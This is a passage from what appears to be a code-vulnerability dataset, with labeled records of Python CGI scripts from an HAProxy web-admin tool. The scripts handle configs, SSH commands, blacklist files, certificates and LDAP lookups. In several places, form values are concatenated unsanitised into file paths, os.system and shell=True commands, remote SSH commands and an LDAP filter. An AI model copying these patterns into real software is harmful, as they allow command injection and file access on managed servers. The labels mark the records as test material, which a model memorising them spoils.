figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@conn\"),\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['conn'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\n\t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\t\t\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('get_hap_v'):\n\toutput = funct.check_haproxy_version(serv)\n\tprint(output)\n\t\nif form.getvalue('bwlists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists')\n\ttry:\n\t\tfile = open(list, \"r\")\n\t\tfile_read = file.read()\n\t\tfile.close\n\t\tprint(file_read)\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>')\n\t\t\nif form.getvalue('bwlists_create'):\n\tlist_name = form.getvalue('bwlists_create').split('.')[0]\n\tlist_name += '.lst'\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name\n\ttry:\n\t\topen(list, 'a').close()\n\t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>')\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e)\n\t\t\nif form.getvalue('bwlists_save'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save')\n\ttry:\n\t\twith open(list, \"w\") as file:\n\t\t\tfile.write(form.getvalue('bwlists_content'))\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e)\n\t\n\tservers = sql.get_dick_permit()\n\tpath = sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color')\n\t\n\tfor server in servers:\n\t\tfunct.ssh_command(server[2], [\"sudo mkdir \"+path])\n\t\terror = funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath')\n\t\tif error:\n\t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t\n\t\telse:\n\t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')\n\t\t\tif form.getvalue('bwlists_restart') == 'restart':\n\t\t\t\tfunct.ssh_command(server[2], [\"sudo \" + sql.get_setting('restart_command')])\n\t\t\t\nif form.getvalue('get_lists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')\n\tlists = funct.get_files(dir=list, format=\"lst\")\n\tfor list in lists:\n\t\tprint(list)\n\t\t\nif form.getvalue('get_ldap_email'):\n\tusername = form.getvalue('get_ldap_email')\n\timport ldap\n\t\n\tserver = sql.get_setting('ldap_server')\n\tport = sql.get_setting('ldap_port')\n\tuser = sql.get_setting('ldap_user')\n\tpassword = sql.get_setting('ldap_password')\n\tldap_base = sql.get_setting('ldap_base')\n\tdomain = sql.get_setting('ldap_domain')\n\tldap_search_field = sql.get_setting('ldap_search_field')\n\n\tl = ldap.initialize(\"ldap://\"+server+':'+port)\n\ttry:\n\t\tl.protocol_version = ldap.VERSION3\n\t\tl.set_option(ldap.OPT_REFERRALS, 0)\n\n\t\tbind = l.simple_bind_s(user, password)\n\n\t\tcriteria = \"(&(objectClass=user)(sAMAccountName=\"+username+\"))\"\n\t\tattributes = [ldap_search_field]\n\t\tresult = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)\n\n\t\tresults = [entry for dn, entry in result if isinstance(entry, dict)]\n\t\ttry:\n\t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]')\n\t\texcept:\n\t\t\tprint('error: user not found')\n\tfinally:\n\t\tl.unbind()/n/n/n", "label": 0}, {"id": "ba79e7301c5574b91b719298c56fd5129c46cca3", "code": "/app/config.py/n/n#!/usr/bin/env python3\nimport cgi\nimport os\nimport http.cookies\nimport funct\nimport sql\nfrom jinja2 import Environment, FileSystemLoader\nenv = Environment(loader=FileSystemLoader('templates/'))\ntemplate = env.get_template('config.html')\n\nprint('Content-type: text/html\\n')\nfunct.check_login()\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nconfig_read = \"\"\ncfg = \"\"\nstderr = \"\"\nerror = \"\"\naftersave = \"\"\n\ntry:\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\tuser = sql.get_user_name_by_uuid(user_id.value)\n\tservers = sql.get_dick_permit()\n\ttoken = sql.get_token(user_id.value)\n\trole = sql.get_user_role_by_uuid(user_id.value)\nexcept:\n\tpass\n\nhap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\nif serv is not None:\n\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\nif serv is not None and form.getvalue('open') is not None :\n\t\n\ttry:\n\t\tfunct.logging(serv, \"config.py open config\")\n\texcept:\n\t\tpass\n\t\n\terror = funct.get_config(serv, cfg)\n\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\t\tconfig_read = conf.read()\n\t\tconf.close\n\texcept IOError:\n\t\terror += '<br />Can\\'t read import config file'\n\n\tos.system(\"/bin/mv %s %s.old\" % (cfg, cfg))\t\n\nif serv is not None and form.getvalue('config') is not None:\n\ttry:\n\t\tfunct.logging(serv, \"config.py edited config\")\n\texcept:\n\t\tpass\n\t\t\n\tconfig = form.getvalue('config')\n\toldcfg = form.getvalue('oldconfig')\n\tsave = form.getvalue('save')\n\taftersave = 1\n\ttry:\n\t\twith open(cfg, \"a\") as conf:\n\t\t\tconf.write(config)\n\texcept IOError:\n\t\terror = \"Can't read import config file\"\n\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save)\n\t\t\n\tstderr = funct.upload_and_restart(serv, cfg, just_save=save)\n\t\t\n\tfunct.diff_config(oldcfg, cfg)\n\t\n\t#if save:\n\t#\tc = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t#\tc[\"restart\"] = form.getvalue('serv')\n\t#\tprint(c)\n\t\t\n\tos.system(\"/bin/rm -f \" + hap_configs_dir + \"*.old\")\n\n\ntemplate = template.render(h2 = 1, title = \"Working with HAProxy configs\",\n\t\t\t\t\t\t\trole = role,\n\t\t\t\t\t\t\taction = \"config.py\",\n\t\t\t\t\t\t\tuser = user,\n\t\t\t\t\t\t\tselect_id = \"serv\",\n\t\t\t\t\t\t\tserv = serv,\n\t\t\t\t\t\t\taftersave = aftersave,\n\t\t\t\t\t\t\tconfig = config_read,\n\t\t\t\t\t\t\tcfg = cfg,\n\t\t\t\t\t\t\tselects = servers,\n\t\t\t\t\t\t\tstderr = stderr,\n\t\t\t\t\t\t\terror = error,\n\t\t\t\t\t\t\tnote = 1,\n\t\t\t\t\t\t\ttoken = token)\nprint(template)/n/n/n/app/funct.py/n/n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\n\ndef get_app_dir():\n\td = sys.path[0]\n\td = d.split('/')[-1]\t\t\n\treturn sys.path[0] if d == \"app\" else os.path.dirname(sys.path[0])\t\n\ndef get_config_var(sec, var):\n\tfrom configparser import ConfigParser, ExtendedInterpolation\n\ttry:\n\t\tpath_config = get_app_dir()+\"/haproxy-wi.cfg\"\n\t\tconfig = ConfigParser(interpolation=ExtendedInterpolation())\n\t\tconfig.read(path_config)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')\n\ttry:\n\t\treturn config.get(sec, var)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))\n\t\t\t\t\t\ndef get_data(type):\n\tfrom datetime import datetime\n\tfrom pytz import timezone\n\timport sql\n\tnow_utc = datetime.now(timezone(sql.get_setting('time_zone')))\n\tif type == 'config':\n\t\tfmt = \"%Y-%m-%d.%H:%M:%S\"\n\tif type == 'logs':\n\t\tfmt = '%Y%m%d'\n\tif type == \"date_in_log\":\n\t\tfmt = \"%b %d %H:%M:%S\"\n\t\t\n\treturn now_utc.strftime(fmt)\n\t\t\t\ndef logging(serv, action, **kwargs):\n\timport sql\n\timport http.cookies\n\tlog_path = get_config_var('main', 'log_path')\n\tlogin = ''\n\t\n\tif not os.path.exists(log_path):\n\t\tos.makedirs(log_path)\n\t\t\n\ttry:\n\t\tIP = cgi.escape(os.environ[\"REMOTE_ADDR\"])\n\t\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t\tuser_uuid = cookie.get('uuid')\n\t\tlogin = sql.get_user_name_by_uuid(user_uuid.value)\n\texcept:\n\t\tpass\n\t\t\n\tif kwargs.get('alerting') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/checker-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('metrics') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/metrics-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('keep_alive') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/keep_alive-\"+get_data('logs')+\".log\", \"a\")\n\telse:\n\t\tmess = get_data('date_in_log') + \" from \" + IP + \" user: \" + login + \" \" + action + \" for: \" + serv + \"\\n\"\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\ttry:\t\n\t\tlog.write(mess)\n\t\tlog.close\n\texcept IOError as e:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e)\n\t\tpass\n\t\ndef telegram_send_mess(mess, **kwargs):\n\timport telebot\n\tfrom telebot import apihelper\n\timport sql\n\t\n\ttelegrams = sql.get_telegram_by_ip(kwargs.get('ip'))\n\tproxy = sql.get_setting('proxy')\n\t\n\tfor telegram in telegrams:\n\t\ttoken_bot = telegram[1]\n\t\tchannel_name = telegram[2]\n\t\t\t\n\tif proxy is not None:\n\t\tapihelper.proxy = {'https': proxy}\n\ttry:\n\t\tbot = telebot.TeleBot(token=token_bot)\n\t\tbot.send_message(chat_id=channel_name, text=mess)\n\texcept:\n\t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\")\n\t\tsys.exit()\n\t\ndef check_login(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_uuid = cookie.get('uuid')\n\tref = os.environ.get(\"SCRIPT_NAME\")\n\n\tsql.delete_old_uuid()\n\t\n\tif user_uuid is not None:\n\t\tsql.update_last_act_user(user_uuid.value)\n\t\tif sql.get_user_name_by_uuid(user_uuid.value) is None:\n\t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\telse:\n\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\t\t\t\t\ndef is_admin(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\ttry:\n\t\trole = sql.get_user_role_by_uuid(user_id.value)\n\texcept:\n\t\trole = 3\n\t\tpass\n\tlevel = kwargs.get(\"level\")\n\t\t\n\tif level is None:\n\t\tlevel = 1\n\t\t\n\ttry:\n\t\treturn True if role <= level else False\n\texcept:\n\t\treturn False\n\t\tpass\n\ndef page_for_admin(**kwargs):\n\tgive_level = 1\n\tgive_level = kwargs.get(\"level\")\n\t\t\n\tif not is_admin(level = give_level):\n\t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n\t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n\t\timport sys\n\t\tsys.exit()\n\t\t\t\t\ndef ssh_connect(serv, **kwargs):\n\timport paramiko\n\tfrom paramiko import SSHClient\n\timport sql\n\tfullpath = get_config_var('main', 'fullpath')\n\tssh_enable = ''\n\tssh_port = ''\n\tssh_user_name = ''\n\tssh_user_password = ''\n\t\n\tfor sshs in sql.select_ssh(serv=serv):\n\t\tssh_enable = sshs[3]\n\t\tssh_user_name = sshs[4]\n\t\tssh_user_password = sshs[5]\n\t\tssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]\n\n\tservers = sql.select_servers(server=serv)\n\tfor server in servers:\n\t\tssh_port = server[10]\n\n\tssh = SSHClient()\n\tssh.load_system_host_keys()\n\tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ttry:\n\t\tif ssh_enable == 1:\n\t\t\tk = paramiko.RSAKey.from_private_key_file(ssh_key_name)\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)\n\t\telse:\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)\n\t\treturn ssh\n\texcept paramiko.AuthenticationException:\n\t\treturn 'Authentication failed, please verify your credentials'\n\t\tpass\n\texcept paramiko.SSHException as sshException:\n\t\treturn 'Unable to establish SSH connection: %s ' % sshException\n\t\tpass\n\texcept paramiko.BadHostKeyException as badHostKeyException:\n\t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException\n\t\tpass\n\texcept Exception as e:\n\t\tif e == \"No such file or directory\":\n\t\t\treturn '%s. Check ssh key' % e\n\t\t\tpass\n\t\telif e == \"Invalid argument\":\n\t\t\terror = 'Check the IP of the server'\n\t\t\tpass\n\t\telse:\n\t\t\terror = e\t\n\t\t\tpass\n\t\treturn str(error)\n\ndef get_config(serv, cfg, **kwargs):\n\timport sql\n\n\tconfig_path = \"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t\n\tssh = ssh_connect(serv)\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tsftp.get(config_path, cfg)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\tssh = str(e)\n\t\treturn ssh\n\t\ndef diff_config(oldcfg, cfg):\n\tlog_path = get_config_var('main', 'log_path')\n\tdiff = \"\"\n\tdate = get_data('date_in_log') \n\tcmd=\"/bin/diff -ub %s %s\" % (oldcfg, cfg)\n\t\n\toutput, stderr = subprocess_execute(cmd)\n\t\n\tfor line in output:\n\t\tdiff += date + \" \" + line + \"\\n\"\n\ttry:\t\t\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\t\tlog.write(diff)\n\t\tlog.close\n\texcept IOError:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr)\n\t\tpass\n\t\t\ndef install_haproxy(serv, **kwargs):\n\timport sql\n\tscript = \"install_haproxy.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tstats_port = sql.get_setting('stats_port')\n\tserver_state_file = sql.get_setting('server_state_file')\n\tstats_user = sql.get_setting('stats_user')\n\tstats_password = sql.get_setting('stats_password')\n\tproxy = sql.get_setting('proxy')\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tproxy_serv = proxy if proxy is not None else \"\"\n\t\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" + proxy_serv+ \n\t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+\n\t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\t\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\n\tif kwargs.get('syn_flood') == \"1\":\n\t\tsyn_flood_protect(serv)\n\t\ndef syn_flood_protect(serv, **kwargs):\n\timport sql\n\tscript = \"syn_flood_protect.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\t\n\tenable = \"disable\" if kwargs.get('enable') == \"0\" else \"disable\"\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+ \" \"+enable ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\ndef waf_install(serv, **kwargs):\n\timport sql\n\tscript = \"waf.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tproxy = sql.get_setting('proxy')\n\thaproxy_dir = sql.get_setting('haproxy_dir')\n\tver = check_haproxy_version(serv)\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" + proxy+ \n\t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\t\n\tstderr = ssh_command(serv, commands, print_out=\"1\")\n\tif stderr is None:\n\t\tsql.insert_waf_metrics_enable(serv, \"0\")\n\ndef check_haproxy_version(serv):\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tver = \"\"\n\tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tfor line in output:\n\t\tver = line\n\treturn ver\n\t\ndef upload(serv, path, file, **kwargs):\n\terror = \"\"\n\tfull_path = path + file\n\n\tif kwargs.get('dir') == \"fullpath\":\n\t\tfull_path = path\n\t\n\ttry:\n\t\tssh = ssh_connect(serv)\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tfile = sftp.put(file, full_path)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\t\t\n\treturn error\n\t\ndef upload_and_restart(serv, cfg, **kwargs):\n\timport sql\n\ttmp_file = sql.get_setting('tmp_config_path') + \"/\" + get_data('config') + \".cfg\"\n\terror = \"\"\n\t\n\ttry:\n\t\tos.system(\"dos2unix \"+cfg)\n\texcept OSError:\n\t\treturn 'Please install dos2unix' \n\t\tpass\n\t\n\tif kwargs.get(\"keepalived\") == 1:\n\t\tif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf\" ]\n\t\telse:\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\" ]\n\telse:\n\t\tif kwargs.get(\"just_save\") == \"test\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo rm -f \" + tmp_file ]\n\t\telif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') ]\n\t\telse:\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') + \" && sudo \" + sql.get_setting('restart_command') ]\t\n\t\tif sql.get_setting('firewall_enable') == \"1\":\n\t\t\tcommands.extend(open_port_firewalld(cfg))\n\t\n\terror += str(upload(serv, tmp_file, cfg, dir='fullpath'))\n\n\ttry:\n\t\terror += ssh_command(serv, commands)\n\texcept Exception as e:\n\t\terror += e\n\tif error:\n\t\treturn error\n\t\t\ndef open_port_firewalld(cfg):\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>')\n\t\n\tfirewalld_commands = []\n\t\n\tfor line in conf:\n\t\tif \"bind\" in line:\n\t\t\tbind = line.split(\":\")\n\t\t\tbind[1] = bind[1].strip(' ')\n\t\t\tbind = bind[1].split(\"ssl\")\n\t\t\tbind = bind[0].strip(' \\t\\n\\r')\n\t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)\n\t\t\t\t\n\tfirewalld_commands.append('sudo firewall-cmd --reload')\n\treturn firewalld_commands\n\t\ndef check_haproxy_config(serv):\n\timport sql\n\tcommands = [ \"haproxy  -q -c -f %s\" % sql.get_setting('haproxy_config_path') ]\n\tssh = ssh_connect(serv)\n\tfor command in commands:\n\t\tstdin , stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\tif not stderr.read():\n\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\tssh.close()\n\t\t\ndef show_log(stdout):\n\ti = 0\n\tfor line in stdout:\n\t\ti = i + 1\n\t\tline_class = \"line3\" if i % 2 == 0 else \"line\"\n\t\tprint('<div class=\"'+line_class+'\">' + escape_html(line) + '</div>')\n\t\t\t\ndef show_ip(stdout):\n\tfor line in stdout:\n\t\tprint(line)\n\t\t\ndef server_status(stdout):\t\n\tproc_count = \"\"\n\t\n\tfor line in stdout:\n\t\tif \"Ncat: \" not in line:\n\t\t\tfor k in line:\n\t\t\t\tproc_count = k.split(\":\")[1]\n\t\telse:\n\t\t\tproc_count = 0\n\treturn proc_count\t\t\n\ndef ssh_command(serv, commands, **kwargs):\n\tssh = ssh_connect(serv)\n\t\t  \n\tfor command in commands:\n\t\ttry:\n\t\t\tstdin, stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\texcept:\n\t\t\tcontinue\n\t\t\t\t\n\t\tif kwargs.get(\"ip\") == \"1\":\n\t\t\tshow_ip(stdout)\n\t\telif kwargs.get(\"show_log\") == \"1\":\n\t\t\tshow_log(stdout)\n\t\telif kwargs.get(\"server_status\") == \"1\":\n\t\t\tserver_status(stdout)\n\t\telif kwargs.get('print_out'):\n\t\t\tprint(stdout.read().decode(encoding='UTF-8'))\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\telif kwargs.get('retunr_err') == 1:\n\t\t\treturn stderr.read().decode(encoding='UTF-8')\n\t\telse:\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\t\t\n\t\tfor line in stderr.read().decode(encoding='UTF-8'):\n\t\t\tif line:\n\t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\")\n\ttry:\t\n\t\tssh.close()\n\texcept:\n\t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\")\n\t\tpass\n\ndef escape_html(text):\n\treturn cgi.escape(text, quote=True)\n\t\ndef subprocess_execute(cmd):\n\timport subprocess \n\tp = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)\n\tstdout, stderr = p.communicate()\n\toutput = stdout.splitlines()\n\t\n\treturn output, stderr\n\ndef show_backends(serv, **kwargs):\n\timport json\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tcmd='echo \"show backend\" |nc %s %s' % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tret = \"\"\n\tfor line in output:\n\t\tif \"#\" in  line or \"stats\" in line:\n\t\t\tcontinue\n\t\tif line != \"\":\n\t\t\tback = json.dumps(line).split(\"\\\"\")\n\t\t\tif kwargs.get('ret'):\n\t\t\t\tret += back[1]\n\t\t\t\tret += \"<br />\"\n\t\t\telse:\n\t\t\t\tprint(back[1], end=\"<br>\")\n\t\t\n\tif kwargs.get('ret'):\n\t\treturn ret\n\t\t\ndef get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):\n\timport glob\n\tfile = set()\n\treturn_files = set()\n\t\n\tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t\n\t\tfile.add(files.split('/')[-1])\n\tfiles = sorted(file, reverse=True)\n\n\tif format == 'cfg':\n\t\tfor file in files:\n\t\t\tip = file.split(\"-\")\n\t\t\tif serv == ip[0]:\n\t\t\t\treturn_files.add(file)\n\t\treturn sorted(return_files, reverse=True)\n\telse: \n\t\treturn files\n\t\ndef get_key(item):\n\treturn item[0]/n/n/n/app/options.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\nimport funct\nimport sql\nimport ovw\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nact = form.getvalue('act')\n\t\nprint('Content-type: text/html\\n')\n\nif act == \"checkrestart\":\n\tservers = sql.get_dick_permit(ip=serv)\n\tfor server in servers:\n\t\tif server != \"\":\n\t\t\tprint(\"ok\")\n\t\t\tsys.exit()\n\tsys.exit()\n\nif form.getvalue('token') is None:\n\tprint(\"What the fuck?! U r hacker Oo?!\")\n\tsys.exit()\n\t\t\nif form.getvalue('getcerts') is not None and serv is not None:\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"ls -1t \"+cert_path+\" |grep pem\" ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\nif form.getvalue('checkSshConnect') is not None and serv is not None:\n\ttry:\n\t\tfunct.ssh_command(serv, [\"ls -1t\"])\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('getcert') is not None and serv is not None:\n\tid = form.getvalue('getcert')\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"cat \"+cert_path+\"/\"+id ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('ssh_cert'):\n\tname = form.getvalue('name')\n\t\n\tif not os.path.exists(os.getcwd()+'/keys/'):\n\t\tos.makedirs(os.getcwd()+'/keys/')\n\t\n\tssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'\n\t\n\ttry:\n\t\twith open(ssh_keys, \"w\") as conf:\n\t\t\tconf.write(form.getvalue('ssh_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys)\n\ttry:\n\t\tfunct.logging(\"local\", \"users.py#ssh upload new ssh cert %s\" % ssh_keys)\n\texcept:\n\t\tpass\n\t\t\t\nif serv and form.getvalue('ssl_cert'):\n\tcert_local_dir = funct.get_config_var('main', 'cert_local_dir')\n\tcert_path = sql.get_setting('cert_path')\n\t\n\tif not os.path.exists(cert_local_dir):\n\t\tos.makedirs(cert_local_dir)\n\t\n\tif form.getvalue('ssl_name') is None:\n\t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>')\n\telse:\n\t\tname = form.getvalue('ssl_name') + '.pem'\n\t\n\ttry:\n\t\twith open(name, \"w\") as ssl_cert:\n\t\t\tssl_cert.write(form.getvalue('ssl_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' % (serv, cert_path))\n\t\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload(master[0], cert_path, name)\n\ttry:\n\t\tfunct.upload(serv, cert_path, name)\n\texcept:\n\t\tpass\n\t\n\tos.system(\"mv %s %s\" % (name, 